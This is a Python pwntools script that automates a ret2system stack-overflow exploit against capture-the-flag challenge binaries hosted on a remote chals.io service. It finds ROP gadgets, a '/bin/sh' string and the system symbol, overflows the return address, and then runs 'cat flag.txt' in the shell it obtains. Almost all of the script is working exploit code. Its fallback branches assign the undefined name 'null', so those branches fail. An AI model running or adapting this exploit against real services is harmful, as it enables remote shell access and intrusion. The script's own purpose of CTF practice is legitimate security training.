from pwn import *
import detection
import re


# context.log_level = 'ERROR'
# logging.disable(logging.CRITICAL)

# im aware this looks like trash but ill fix it in post
context.update(
    arch="amd64",
    endian="little",
    log_level="warning",
    os="linux",
    # terminal=["tmux", "split-window", "-h", "-p 65"]
    terminal=["st"]
)

def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    if p:
        print('[+] Connected to host')
    e = ELF(binary)
    r = ROP(e)

    p.recvuntil(b'>>>\n')

    payload = b''


    try:
        pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
        ret = r.find_gadget(['ret'])[0]
        print(f"[+] Location of pop RDI : {hex(pop_rdi)}")
    except:
        print('[!] pop rdi; ret; not found')
        pop_rdi = null
        ret = null
        pass

    try:
        system = e.sym['system']
        print(f"[+] System Address: {hex(system)}")
    except KeyError:
        system = null
        print('[!] System not found in a ret2system lol')

    offset = detection.find_rip_offset(binary)
    print("[+] Offset:", offset)

    payload += cyclic(offset)
    payload += p64(ret)
    payload += p64(pop_rdi)

    try:
        shell = next(e.search(b'/bin/sh'))
        print(f"[+]Location of bin/sh: {hex(shell)}")
        payload += p64(shell)
        payload += p64(system)
        p.sendline(payload)
        # p.wait()
        p.sendline(b'cat flag.txt')
    except:
        print('[!] bin/shell not found')
        try:
            cat = next(e.search(b'/bin/cat flag.txt'))
            print(f"[+] Location of bin/cat flag.txt: {hex(cat)}")
            payload += p64(cat)
            payload += p64(system)
            p.sendline(payload)
        except:
            print('[!] Bin/cat flag not found')
            pass

    output = p.recvall(timeout=0.2)
    # print(f"output: {output}")
    flag = re.findall(flag_regex, output.decode())
    if flag:
        return flag[0]
    else:
        return


# def main():  # TEMP FOR TESTING
#     for i in range(10):
#         print(f"bin-ret2system-{i}")
#         flag = exploit(f"bin-ret2system-{i}")
#         print(f"\n[!]{flag}\n")
#
#
# main()
